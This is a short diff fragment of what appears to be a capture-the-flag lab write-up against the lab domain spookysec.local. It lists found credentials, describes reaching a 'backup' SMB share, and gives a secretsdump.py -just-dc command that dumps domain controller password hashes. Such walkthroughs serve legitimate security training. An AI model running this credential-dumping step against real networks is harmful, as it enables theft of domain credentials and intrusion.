@@ -33,4 +33,15 @@ reveals the creds:
 svc-admin:management2005
 ```
 
+We use these creds to connect to the `backup` SMB share where we find a txt file
 
+```
+backup@spookysec.local:backup2517860
+```
+
+---
+
+### secretsdump.py
+```
+secretsdump.py -just-dc backup@spookysec.local
+```
